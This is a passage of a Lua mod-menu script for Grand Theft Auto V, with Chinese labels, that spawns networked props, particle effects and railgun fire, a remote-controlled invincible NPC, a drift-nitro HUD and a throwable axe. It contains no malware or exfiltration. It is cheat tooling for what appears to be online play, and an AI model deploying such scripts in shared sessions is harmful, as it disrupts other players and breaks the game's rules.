                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", katana, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local cam_coord = CAM.GET_FINAL_RENDERED_CAM_COORD()
                    local aim_vector = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                    local aim_dir = v3.toDir(aim_vector)
                    v3.mul(aim_dir, 1000)
                    v3.add(aim_dir, cam_coord)
                    cam_rot.x = cam_rot.x -90
                    Spriterx, Spritery = getScreenCoordFromWorldCoordNoAdjustment(aim_dir.x, aim_dir.y, aim_dir.z)
                    DrawingSpriter("commonmenu", "ESP_BOX", Spriterx - 0.0025, Spritery, 0.02, 0.001, 270, 255, 0, 0, 255)
                    DrawingSpriter("commonmenu", "ESP_BOX", Spriterx - 0.0025, Spritery, 0.0008, 0.02, 270, 255, 0, 0, 255)
                    DrawingSpriter("helicopterhud", "hud_corner", Spriterx - 0.01, Spritery - 0.01, 0.01, 0.015, 0, 255, 0, 0, 255)
                    DrawingSpriter("helicopterhud", "hud_corner", Spriterx + 0.005, Spritery - 0.01, 0.01, 0.015, 90, 255, 0, 0, 255)
                    DrawingSpriter("helicopterhud", "hud_corner", Spriterx + 0.005, Spritery + 0.01, 0.01, 0.015, 180, 255, 0, 0, 255)
                    DrawingSpriter("helicopterhud", "hud_corner", Spriterx - 0.01, Spritery + 0.01, 0.01, 0.015, 270, 255, 0, 0, 255)
                    local katanapos = ENTITY.GET_ENTITY_COORDS(katana, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", katanapos.x, katanapos.y, katanapos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    request_ptfx_asset("scr_reconstructionaccident")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", katana_reverse, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(katanapos.x, katanapos.y, katanapos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                    local katana_reversepos = ENTITY.GET_ENTITY_COORDS(katana_reverse, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", katana_reversepos.x, katana_reversepos.y, katana_reversepos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    request_ptfx_asset("scr_reconstructionaccident")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", katana_Right, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(katana_reversepos.x, katana_reversepos.y, katana_reversepos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                    local katana_Rightpos = ENTITY.GET_ENTITY_COORDS(katana_Right, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", katana_Rightpos.x, katana_Rightpos.y, katana_Rightpos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    request_ptfx_asset("scr_reconstructionaccident")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", katana_Left, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(katana_Rightpos.x, katana_Rightpos.y, katana_Rightpos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                    local katana_Leftpos = ENTITY.GET_ENTITY_COORDS(katana_Left, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", katana_Leftpos.x, katana_Leftpos.y, katana_Leftpos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(katana_Leftpos.x, katana_Leftpos.y, katana_Leftpos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                    local zkatanapos = ENTITY.GET_ENTITY_COORDS(zkatana, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", zkatanapos.x, zkatanapos.y, zkatanapos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    request_ptfx_asset("scr_reconstructionaccident")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", zkatana, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(zkatanapos.x, zkatanapos.y, zkatanapos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                    local zkatana_reversepos = ENTITY.GET_ENTITY_COORDS(zkatana_reverse, true)
                    request_ptfx_asset("weap_xs_weapons")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", zkatana_reversepos.x, zkatana_reversepos.y, zkatana_reversepos.z, cam_rot.x, cam_rot.y, cam_rot.z, 1, false, false, false)
                    request_ptfx_asset("scr_reconstructionaccident")
                    GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("scr_sparking_generator", zkatana_reverse, 0, 0.1, 0.9, 0, 0, 0, 0, 1, false, false, false, 0, 0, 0, 0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(zkatana_reversepos.x, zkatana_reversepos.y, zkatana_reversepos.z, aim_dir.x, aim_dir.y, aim_dir.z, 1000, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), false, true, 1.0)
                else
                    targetshootX = 0
                    shootX = lerp(shootX, targetshootX, shootspeed)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1, players.user_ped(), 0, 0.1, -0.1, 0.5, timemove+shootX, 35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1, players.user_ped(), 0, 0.1, -0.1, 0.4, timemove+shootX, 90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.5, timemove+shootX, -35, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(zrodm1_reverse, players.user_ped(), 0, -0.1, -0.1, 0.4, timemove+shootX, -90, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Right, players.user_ped(), 0, 0.1, -0.1, 0.3, timemove+shootX, 135, 0, false, false, false, true, 0, true)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(rodm1_Left, players.user_ped(), 0, -0.1, -0.1, 0.3, timemove+shootX, -135, 0, false, false, false, true, 0, true)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(katana)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(katana_reverse)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(katana_Right)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(katana_Left)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(zkatana)
                    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(zkatana_reverse)
                    if changeshootX >= 0 then
                        if shootX <= 0.001 then
                            shoot_back = false
                        end
                    else
                        if shootX >= 0.001 then
                            shoot_back = false
                        end
                    end
                end
            end)
            --
        else
            util.shoot_thread(threadyx)
            util.shoot_thread(movesleep)
            entities.delete_by_handle(rodm1)
            entities.delete_by_handle(rodm2)
            entities.delete_by_handle(rodm3)
            entities.delete_by_handle(rodm4)
            entities.delete_by_handle(katana)
            entities.delete_by_handle(zrodm1)
            entities.delete_by_handle(zrodm2)
            entities.delete_by_handle(zrodm3)
            entities.delete_by_handle(zrodm4)
            entities.delete_by_handle(zkatana)
            entities.delete_by_handle(rodm1_reverse)
            entities.delete_by_handle(rodm2_reverse)
            entities.delete_by_handle(rodm3_reverse)
            entities.delete_by_handle(rodm4_reverse)
            entities.delete_by_handle(katana_reverse)
            entities.delete_by_handle(zrodm1_reverse)
            entities.delete_by_handle(zrodm2_reverse)
            entities.delete_by_handle(zrodm3_reverse)
            entities.delete_by_handle(zrodm4_reverse)
            entities.delete_by_handle(zkatana_reverse)
            entities.delete_by_handle(rodm1_Right)
            entities.delete_by_handle(rodm2_Right)
            entities.delete_by_handle(rodm3_Right)
            entities.delete_by_handle(rodm4_Right)
            entities.delete_by_handle(katana_Right)
            entities.delete_by_handle(rodm1_Left)
            entities.delete_by_handle(rodm2_Left)
            entities.delete_by_handle(rodm3_Left)
            entities.delete_by_handle(rodm4_Left)
            entities.delete_by_handle(katana_Left)
        end
    end)
    GTTG(Doctor_Octopus, "邪魔之眼+章鱼博士", {}, "非常帅", function (f)
        if f then
            menu.trigger_commands("octopusmode on")
            menu.trigger_commands("demoneyes on")
        else
            menu.trigger_commands("octopusmode off")
            menu.trigger_commands("demoneyes off")
        end
    end)
    ultra_object = nil
    ultra_s = GTTG(mastervip, "佳佳的凳子", {"ultradengzi"}, "", function(on)
        local animGroup = "timetable@reunited@ig_10" 
        local animName = "base_amanda"
        local ped = players.user_ped() -- 获取玩家的角色实体
        local props = {
            {
                Bone =  64729, -- 骨骼索引
                Prop = "h4_prop_battle_club_chair_02", -- 道具模型名称
                Placement = {0.175, 0, 0.5, 180, 20, 30}, -- 道具位置
            }
        }
        if on then
            if props ~= nil then
                local pos = ENTITY.GET_ENTITY_COORDS(ped)
                for _, propData in ipairs(props) do
                    local boneIndex = PED.GET_PED_BONE_INDEX(ped, propData.Bone)
                    local hash = util.joaat(propData.Prop)
                    STREAMING.REQUEST_MODEL(hash) --模型加载
                    while not STREAMING.HAS_MODEL_LOADED(hash) do
                        wait()
                    end
                    STREAMING.REQUEST_ANIM_DICT(animGroup) --动画加载
                    while not STREAMING.HAS_ANIM_DICT_LOADED(animGroup) do
                        wait(100)
                    end
                    local object = entities.create_object(hash, pos)
                    animAttachments[object] = propData.DeleteOnEnd ~= nil
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(
                        object, ped, boneIndex,
                        propData.Placement[1] or 0.0,
                        propData.Placement[2] or 0.0,
                        propData.Placement[3] or 0.0,
                        propData.Placement[4] or 0.0,
                        propData.Placement[5] or 0.0,
                        propData.Placement[6] or 0.0,
                        false,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
                    ultra_object = object
                end
            end
            TASK.TASK_PLAY_ANIM(ped, animGroup, animName, 5.0, 5.0, -1, 1, 0.0, false, false, false)
        else
            TASK.STOP_ANIM_TASK(players.user_ped(), animGroup, animName, 5)
            if ultra_object ~= nil then
                ENTITY.DETACH_ENTITY(ultra_object)
                entities.delete_by_handle(ultra_object)
                ultra_object = nil 
            end
        end
    end)
    ultra_s.visible = false
    GTTG(mastervip, "Ultra王座", {"ultramagic"}, "定制级功能:)", function(on)
        if on then
            menu.trigger_commands("ultradengzi on")
            menu.trigger_commands("jiajia2 on")
            menu.trigger_commands("lens on")
        else
            menu.trigger_commands("ultradengzi off")
            menu.trigger_commands("jiajia2 off")
            menu.trigger_commands("lens off")
        end
    end)
    boolaction = false 
    mastervip:toggle_loop("马可波罗", {}, "WASD移动,空格升高,Ctrl下降,Shift加速", function()
        if not boolaction then
            request_anim("misscommon@response")
            TASK.TASK_PLAY_ANIM(players.user_ped(), "misscommon@response", "bring_it_on", 8.0, 8.0, -1, 49, 0.3, true, true, true)
            boolaction = true 
        end
        ENTITY.SET_ENTITY_ANIM_CURRENT_TIME(players.user_ped(), "misscommon@response", "bring_it_on", 0.3)
        local rotationSpeed = 10 
        local currentRotation = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
        currentRotation.z = currentRotation.z + rotationSpeed
        ENTITY.SET_ENTITY_ROTATION(players.user_ped(), currentRotation.x, currentRotation.y, currentRotation.z, 2, true)
        local fingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0x49d9, 0, 0, 0)
        local fingerTipPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0x49d9, 0.1, 0, 0)
        local direction = {
            x = fingerTipPos.x - fingerPos.x,
            y = fingerTipPos.y - fingerPos.y,
            z = fingerTipPos.z - fingerPos.z
        }
        local shootDistance = 1000.0
        local endPos = {
            x = fingerTipPos.x + direction.x * shootDistance,
            y = fingerTipPos.y + direction.y * shootDistance,
            z = fingerTipPos.z + direction.z * shootDistance
        }
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(
            fingerPos.x, fingerPos.y, fingerPos.z,
            endPos.x, endPos.y, endPos.z,
            0,
            true,
            joaat("WEAPON_RAILGUN"),
            players.user_ped(),
            true,
            true,
            10000,
            players.user_ped()
        )
        local rightFingerPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xdead, 0, 0, 0)
        local rightFingerTipPos = PED.GET_PED_BONE_COORDS(players.user_ped(), 0xdead, 0.1, 0, 0)
        local rightDirection = {
            x = rightFingerTipPos.x - rightFingerPos.x,
            y = rightFingerTipPos.y - rightFingerPos.y,
            z = rightFingerTipPos.z - rightFingerPos.z
        }
        local rightEndPos = {
            x = rightFingerTipPos.x + rightDirection.x * shootDistance,
            y = rightFingerTipPos.y + rightDirection.y * shootDistance,
            z = rightFingerTipPos.z - rightDirection.z * shootDistance + 18
        }
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(
            rightFingerPos.x, rightFingerPos.y, rightFingerPos.z,
            rightEndPos.x, rightEndPos.y, rightEndPos.z,
            0,
            true,
            util.joaat("WEAPON_RAILGUN"),
            players.user_ped(),
            true,
            true,
            10000,
            players.user_ped()
        )
        local camRot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local dir = {
            x = -math.sin(math.rad(camRot.z)) * 20,
            y = math.cos(math.rad(camRot.z)) * 20,
            z = math.sin(math.rad(camRot.x)) * 20
        }
        local moveX, moveY, moveZ = 0, 0, 0
        local speedMultiplier = 1
        if PAD.IS_CONTROL_PRESSED(0, 61) then -- Shift键
            speedMultiplier = 3 
        end
        if PAD.IS_CONTROL_PRESSED(0, 32) then -- W 键
            moveX = dir.x * speedMultiplier
            moveY = dir.y * speedMultiplier
        elseif PAD.IS_CONTROL_PRESSED(0, 33) then -- S 键
            moveX = -dir.x * speedMultiplier
            moveY = -dir.y * speedMultiplier
        end
        if PAD.IS_CONTROL_PRESSED(0, 34) then -- A 键
            local leftDir = {
                x = -math.cos(math.rad(camRot.z)) * 20 * speedMultiplier,
                y = -math.sin(math.rad(camRot.z)) * 20 * speedMultiplier
            }
            moveX = moveX + leftDir.x
            moveY = moveY + leftDir.y
        end
        if PAD.IS_CONTROL_PRESSED(0, 35) then -- D 键
            local rightDir = {
                x = math.cos(math.rad(camRot.z)) * 20 * speedMultiplier,
                y = math.sin(math.rad(camRot.z)) * 20 * speedMultiplier
            }
            moveX = moveX + rightDir.x
            moveY = moveY + rightDir.y
        end
        if PAD.IS_CONTROL_PRESSED(0, 22) then -- 空格键升高
            moveZ = 20 * speedMultiplier
        elseif PAD.IS_CONTROL_PRESSED(0, 36) then -- Ctrl 键下降
            moveZ = -20 * speedMultiplier
        end
        ENTITY.SET_ENTITY_VELOCITY(players.user_ped(), moveX, moveY, moveZ)
    end, function()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
        boolaction = false
    end)
    mastervip:toggle("远程控制NPC", {}, "WASD移动 X激光眼 Shift跑步\nF进入车辆 E键下车 \n鼠标左键击打 空格跳跃\nCtrl蹲下\nB键拿枪 N键删枪 鼠标右键发射子弹", function(stats)
        if stats then
            local blackped = util.joaat('S_M_Y_Doorman_01')
            local self_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 1, 0)
            request_model(blackped)
            local pop_black = entities.create_ped(-1, blackped, self_coords, 0)
            util.create_tick_handler(function()
                if ENTITY.DOES_ENTITY_EXIST(pop_black) then
                    PAD.DISABLE_ALL_CONTROL_ACTIONS(0)
                    for i = 0, 6 do
                        PAD.ENABLE_CONTROL_ACTION(0, i, true)
                    end
                    ENTITY.SET_ENTITY_INVINCIBLE(pop_black, true)
                    PED.SET_PED_RESET_FLAG(pop_black, 124, true)
                end
                local move_speed = 5
                local speed_mult = util.is_key_down(0x10) and 3.0 or 1.0
                if not PED.IS_PED_IN_ANY_VEHICLE(pop_black) then
                    if util.is_key_down(0x57) then -- W向前
                        move_ped(pop_black, move_speed * speed_mult, 0)
                    end
                    if util.is_key_down(0x53) then -- S向后
                        move_ped(pop_black, -move_speed * speed_mult, 0)
                    end
                    if util.is_key_down(0x41) then -- A向左
                        move_ped(pop_black, 0, -move_speed * speed_mult)
                    end
                    if util.is_key_down(0x44) then -- D向右
                        move_ped(pop_black, 0, move_speed * speed_mult)
                    end
                    if util.is_key_down(0x10) then -- shift跑步
                        PED.SET_PED_MOVE_RATE_OVERRIDE(pop_black, 2.0)
                    end
                    if util.is_key_down(0x11) then -- ctrl蹲伏
                        PED.SET_PED_MOVEMENT_CLIPSET(pop_black, 'move_ped_crouched', 0.5)
                        PED.SET_PED_STRAFE_CLIPSET(pop_black, 'move_ped_crouched_strafing')
                    else
                        PED.RESET_PED_MOVEMENT_CLIPSET(pop_black, 0.5)
                        PED.RESET_PED_STRAFE_CLIPSET(pop_black)
                    end
                    if util.is_key_down(0x58) then -- x激光眼
                        move_laser_eyes(pop_black)
                    end
                    if util.is_key_down(0x46) then -- F键进入最近的车辆
                        local vehtable = entities.get_all_vehicles_as_handles()
                        for _, v in pairs(vehtable) do
                            local veh_pos = ENTITY.GET_ENTITY_COORDS(v)
                            local ped_pos = ENTITY.GET_ENTITY_COORDS(pop_black)
                            if v3.distance(veh_pos, ped_pos) < 5 then
                                TASK.TASK_ENTER_VEHICLE(pop_black, v, 5000, -1, 2.0, 1, 0)
                                break
                            end
                        end
                    end
                    if util.is_key_down(0x01) then -- 左键击打
                        request_anim("melee@unarmed@streamed_core")
                        TASK.TASK_PLAY_ANIM(pop_black, "melee@unarmed@streamed_core", "heavy_punch_a", 4.0, 4.0, -1, 0, 0.3, false, false, false)
                    end
                    if util.is_key_down(0x20) then -- 空格跳跃
                        TASK.TASK_JUMP(pop_black, true)
                    end
                    if util.is_key_down(0x42) then -- B键拿枪
                        WEAPON.GIVE_WEAPON_TO_PED(pop_black, 0xDBBD7280, 9999, true, true)
                    end
                    if util.is_key_down(0x4E) then -- N键删枪
                        WEAPON.REMOVE_WEAPON_FROM_PED(pop_black, 0xDBBD7280)
                    end
                    if util.is_key_down(0x02) then -- 右键发射子弹
                    if WEAPON.IS_PED_ARMED(pop_black, 6) then
                        HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
                        local result = raycast_gameplay_cam(1, 1000)
                        local ped_pos = ENTITY.GET_ENTITY_COORDS(pop_black)
                        local hit, end_coords, surface_normal, hit_entity = result[1], result[2], result[3], result[4]
                        TASK.TASK_AIM_GUN_AT_COORD(pop_black, end_coords.x, end_coords.y, end_coords.z, 3000, false, false)
                        TASK.TASK_SHOOT_AT_COORD(pop_black, end_coords.x, end_coords.y, end_coords.z, 2000, util.joaat('FIRING_PATTERN_FULL_AUTO'))
                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(ped_pos.x, ped_pos.y, ped_pos.z, end_coords.x, 
                        end_coords.y, end_coords.z, 250, true, 0xDBBD7280, pop_black, false, true, 1.0)
                        end
                     end
                    CAM.SET_GAMEPLAY_CAM_FOLLOW_PED_THIS_UPDATE(pop_black)
                else
                    -- 驾驶车辆逻辑
                    local vehicle = PED.GET_VEHICLE_PED_IS_IN(pop_black, false)
                    if vehicle then
                        local steer_direction = 0
                        local forward_direction = 0
                        if util.is_key_down(0x41) then -- A左转
                            steer_direction = -1
                        end
                        if util.is_key_down(0x44) then -- D右转
                            steer_direction = 1
                        end
                        if util.is_key_down(0x57) then -- W向前驾驶
                            forward_direction = 1
                        end
                        if util.is_key_down(0x53) then -- S刹车
                            forward_direction = -1
                        end
                        drive_vehicle_smoothly(vehicle, pop_black, forward_direction * move_speed * speed_mult, steer_direction)
                    end
                    if util.is_key_down(0x45) then -- E键下车
                        local vehicle = PED.GET_VEHICLE_PED_IS_IN(pop_black, false)
                        if vehicle then
                            PED.SET_PED_INTO_VEHICLE(pop_black, vehicle, -1) 
                            TASK.TASK_LEAVE_VEHICLE(pop_black, vehicle, 0)
                        end
                    end
                    CAM.SET_GAMEPLAY_CAM_FOLLOW_PED_THIS_UPDATE(pop_black)
                end
            end)
            ent_black = pop_black
        else
            if ent_black and ENTITY.DOES_ENTITY_EXIST(ent_black) then
                entities.delete_by_handle(ent_black)
            end
        end
    end)
    qqflytt = false
    nitro_charge = 0 -- 追踪漂移时间
    nitro_ready = false -- 标识氮气是否已经集满
    nitro_boost_time = 1000 -- 氮气释放时间（毫秒）
    nitro_boost_active = false -- 标识氮气是否正在释放
    show_nitro_ready_text = false -- 是否显示氮气已满提示
    flash_state = false
    flash_timer = 0
    flash_interval = 500 -- 闪烁间隔时间
    nitro = util.create_tick_handler(function()
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) and qqflytt == true then
            player_cur_car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
            formid = TheQQflyScale("instructional_buttons")
            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(formid, 1, 1, 1, 1, 0)
            if PAD.IS_CONTROL_PRESSED(21, 21) then -- 按住shift键
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true) -- 启用车辆减小抓地力（漂移）
                if not nitro_ready then
                    nitro_charge = math.min(nitro_charge + 0.005, 1.0) -- 每次循环增加漂移时间，最大为1.0
                    if nitro_charge >= 1.0 then
                        nitro_ready = true -- 氮气集满
                        show_nitro_ready_text = true -- 显示提示文本
                    end
                end
            else
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false) -- 释放Shift键时恢复正常抓地力
            end
        end
    end)
    flash = util.create_tick_handler(function()
        if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) and qqflytt == true then
            player_cur_car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
            -- 管理闪烁效果
            flash_timer = flash_timer + util.current_time_millis()
            if flash_timer > flash_interval then
                flash_state = not flash_state
                flash_timer = 0
            end
            -- 绘制氮气集成条
            draw_string(string.format("~bold~~italic~~b~N O"), 0.40, 0.89, 0.6, 5)
            draw_string(string.format("~bold~~italic~~b~2"), 0.416, 0.906, 0.27, 5)
            -- 闪烁的效果
            if nitro_charge >= 1.0 then
                local rect_color = flash_state and {0.0, 1.0, 1.0} or {1.0, 0.0, 0.0} -- 闪烁颜色
                directx.draw_rect(0.4, 0.93, 0.2 * nitro_charge, 0.03, rect_color[1], rect_color[2], rect_color[3], 1.0)
            else
                directx.draw_rect(0.4, 0.93, 0.2 * nitro_charge, 0.03, 0.0, 1.0, 1.0, 1.0) -- 非闪烁颜色
            end
            -- 绘制速度表
            directx.draw_line(0.56, 0.905, 0.60, 0.905, 1, 1, 1, 1, 1, 0, 1, 1)
            directx.draw_line(0.55, 0.93, 0.56, 0.905, 1, 0, 1, 1, 1, 1, 1, 1)
            directx.draw_line(0.555, 0.93, 0.565, 0.905, 1, 0, 1, 1, 1, 1, 1, 1)
            directx.draw_line(0.560, 0.93, 0.570, 0.905, 1, 0, 1, 1, 1, 1, 1, 1)
            directx.draw_line(0.60, 0.93, 0.60, 0.905, 1, 0, 1, 1)
            local speed = ENTITY.GET_ENTITY_SPEED(player_cur_car)
            local speedcalc = speed * 3.6
            myspeed1 = math.ceil(speedcalc)
            draw_string(string.format("~bold~~italic~~q~"..myspeed1), 0.572, 0.902, 0.35, 1)
            -- 绘制矩形边框
            local rect_x = 0.4
            local rect_y = 0.93
            local rect_width = 0.2
            local rect_height = 0.03
            directx.draw_line(rect_x, rect_y, rect_x + rect_width, rect_y, 1, 1, 1, 1, 1, 0, 1, 1) -- 上边
            directx.draw_line(rect_x, rect_y, rect_x, rect_y + rect_height, 1, 1, 1, 1, 1, 0, 1, 1) -- 左边
            directx.draw_line(rect_x + rect_width, rect_y, rect_x + rect_width, rect_y + rect_height, 1, 0, 1, 1, 1, 1, 1, 1) -- 右边
            directx.draw_line(rect_x, rect_y + rect_height, rect_x + rect_width, rect_y + rect_height, 1, 0, 1, 1, 1, 1, 1, 1) -- 下边
            directx.draw_triangle(0.05, 0.5, 0.15, 0.4, 0.15, 0.6, 0, 1, 1, 1*0.68) -- 左边三角形
            directx.draw_triangle(0.28, 0.5, 0.18, 0.4, 0.18, 0.6, 0, 1, 1, 1*0.68) -- 右边三角形
            if util.is_key_down(0x41) then -- A
                directx.draw_triangle(0.05, 0.5, 0.15, 0.4, 0.15, 0.6, 0, 1, 0, 1)
            elseif util.is_key_down(0x44) then -- D
                directx.draw_triangle(0.28, 0.5, 0.18, 0.4, 0.18, 0.6, 0, 1, 0, 1)
            end
            if show_nitro_ready_text then
                draw_string("~bold~~italic~~r~Nitro Ready!", 0.61, 0.92, 0.6, 5) -- 显示氮气集满提示
            end
            -- 当氮气集满并按下E键时触发加速
            if nitro_ready and not nitro_boost_active and util.is_key_down(0x45) then -- E键
                nitro_boost_active = true
                show_nitro_ready_text = false -- 停止显示提示文本
                local start_time = util.current_time_millis() -- 记录加速开始时间
                local initial_nitro_charge = nitro_charge -- 保存初始的氮气量
                util.create_tick_handler(function()
                    local elapsed_time = util.current_time_millis() - start_time
                    if elapsed_time < nitro_boost_time then
                        local vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
                        vel.z = -vel.z
                        ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 2, 0, 0, -50 - vel.z, 0, 0, 0, 0, true, false, true, false, true)
                        -- 持续加速，逐渐减少氮气条
                        VEHICLE.SET_VEHICLE_FORWARD_SPEED(player_cur_car, ENTITY.GET_ENTITY_SPEED(player_cur_car) + 0.1)
                        nitro_charge = initial_nitro_charge * (1.0 - (elapsed_time / nitro_boost_time))
                        vehfx_to()
                        return true
                    else
                        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(myvehicle)
                        nitro_charge = 0 -- 重置氮气集成条
                        nitro_ready = false -- 重置氮气状态
                        nitro_boost_active = false
                        return false -- 停止线程
                    end
                end)
            end
        end
    end)
    mastervip:toggle("飞行斧", {}, "右键切换状态,手持状态时按E丢出,丢出后按右键可召回", function(on)
        if on then
            local axe_model = util.joaat("prop_ld_fireaxe")
            local coordinates_to_spawn = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 0, 6.5)
            request_model(axe_model, 2000)
            entity_axe = OBJECT.CREATE_OBJECT(axe_model, coordinates_to_spawn.x, coordinates_to_spawn.y, coordinates_to_spawn.z, true, false, false)
            NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(entity_axe)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.OBJ_TO_NET(entity_axe), true)
            local blip = HUD.ADD_BLIP_FOR_ENTITY(entity_axe)
            HUD.SET_BLIP_DISPLAY(blip, 8)
            HUD.SET_BLIP_SPRITE(blip, 154)
            HUD.SET_BLIP_COLOUR(blip, 38)
            local radius = 10.0 -- 旋转半径
            local speed = 7.0 -- 速度
            local attached = false -- 斧头是否附加到手上的状态
            local thrown = false -- 斧头是否被丢出的状态
            util.create_tick_handler(function()
                -- 检测右键输入
                if PAD.IS_CONTROL_JUST_PRESSED(0, 25) then -- 右键的控件ID是25
                    attached = not attached -- 切换状态
                    thrown = false -- 重置丢出状态
                    if attached then
                        local player_ped = players.user_ped()
                        -- 附加斧头到玩家手上
                        bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(player_ped, "IK_R_Hand")
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(entity_axe, player_ped, bone, 0.08, 0, -0.02, -100, -180, -10, false, false, true, true, 0, true, 0)
                    else
                        -- 恢复旋转状态
                        ENTITY.DETACH_ENTITY(entity_axe, true, true)
                    end
                end
                -- 检测E键输入进行丢出
                if PAD.IS_CONTROL_JUST_PRESSED(0, 38) then
                    if attached then
                        if ENTITY.DOES_ENTITY_EXIST(entity_axe) then 
                        attached = false
                        thrown = true
                        ENTITY.DETACH_ENTITY(entity_axe, true, true)
